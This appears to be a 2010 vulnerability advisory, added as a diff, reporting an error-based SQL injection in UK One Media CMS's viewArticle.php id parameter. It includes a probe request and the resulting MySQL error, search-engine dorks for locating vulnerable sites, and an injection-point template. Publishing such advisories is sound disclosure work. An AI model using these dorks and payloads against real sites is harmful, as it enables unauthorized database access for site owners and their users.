@@ -1,0 +1,106 @@
+					O
+				       / \
+				      /	  \
+				     /	   \
+				    /	    \
+				   /	     \
+				  /	      \
+				 /	       \
+				/		\
+			       /		 \
+			      /			  \
+			     /			   \
+			    /			    \
+			   /			     \
+			  /			      \
+			 /			       \
+			/				\
+		       /				 \
+		      /					  \
+		     /					   \
+		    /					    \
+		   /					     \
+		  /					      \
+		 /					       \
+		/						\
+	       /						 \
+	      /							  \
+	     /							   \
+	    /							    \
+	   /							     \
+	  /							      \
+	 /							       \
+	/								\
+       /								 \
+      /									  \
+     /									   \
+    /									    \
+   /									     \
+  /									      \
+ /									       \
+/										\
+#################################################################################
+|										|
+|										| 
+| UK One Media CMS (id) Error Based SQL Injection Vulnerability			|
+|										|
+|										|
+|										|
+| Summary: Content Management System (PHP+MySQL)				|
+|										|
+| Vendor: UK One Media - http://www.uk1media.com				|
+|										|
+| Desc: UK One Media CMS suffers from an sql injection vulnerability		|
+| when parsing query from the id param which results in compromising		|
+| the entire database structure and executing system commands.			|
+|										|
+| Tested on Apache 2.x (linux), PHP/5.2.11 and MySQL/4.1.22			|
+|										|
+|										|
+---------------------------------------------------------------------------------
+|										|
+| GET .../viewArticle.php?id=xx%27						|
+|										|
+| Warning: mysql_fetch_array(): supplied argument is not a valid MySQL		|
+| result resource in /home/lqwrm/public_html/xxx/include/DbConnector.php	|
+| on line xx.									|
+|										|
+---------------------------------------------------------------------------------
+|										|
+|										|
+|										|
+| Vulnerability discovered by Gjoko 'LiquidWorm' Krstic				|
+|										|
+| liquidworm gmail com								|
+|										|
+| http://www.zeroscience.mk							|
+|										|
+|										|
+|										|
+| Advisory ID: ZSL-2010-4942							|
+|										|
+| Advisory: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2010-4942.php	|
+|										|
+|										|
+| 24.05.2010									|
+|										|
+|										|
+#################################################################################
+|										|
+|										|
+| Dorks:									|
+|										|
+|	"Web Design London by UK One Media - ecommerce - Web Hosting"		|
+|	"Powered by Websoftrus CMS"						|
+|										|
+|										|
+|										|
+|										|
+| Point:									|
+|										|
+|	http://www.example.com/viewArticle.php?id=[value]+and+1=0+[evil query]	|
+|										|
+|										|
+|										|
+|										|
+#################################################################################
